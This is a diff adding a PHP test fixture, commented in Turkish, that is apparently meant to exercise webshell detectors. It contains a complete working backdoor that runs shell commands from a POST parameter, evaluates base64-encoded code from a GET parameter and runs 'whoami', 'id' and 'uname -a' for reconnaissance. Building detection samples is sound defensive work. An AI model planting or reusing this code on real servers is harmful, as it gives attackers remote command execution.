@@ -1,0 +1,27 @@
+<?php
+/**
+ * Webshell Detector Test - MALICIOUS
+ * * UYARI: Bu dosya sadece test ortamlarında imza ve pattern tespiti 
+ * amacıyla kullanılmalıdır. Güvenli olmayan sunucularda barındırmayınız.
+ */
+
+// 1. Klasik arka kapı pattern'i (YARA/Regex tespiti için)
+if (isset($_POST['cmd'])) {
+    $command = $_POST['cmd'];
+    
+    // Yaygın webshell fonksiyonları
+    system($command);
+}
+
+// 2. Gizlenmiş (Obfuscated) kod yürütme pattern'i
+if (isset($_GET['execute'])) {
+    $encoded_payload = $_GET['execute'];
+    // Detektörlerin "eval" ve "base64_decode" kombinasyonunu yakalaması beklenir
+    eval(base64_decode($encoded_payload));
+}
+
+// 3. Bilgi sızdırma pattern'i
+if (isset($_GET['info'])) {
+    @shell_exec('whoami && id && uname -a');
+}
+?>
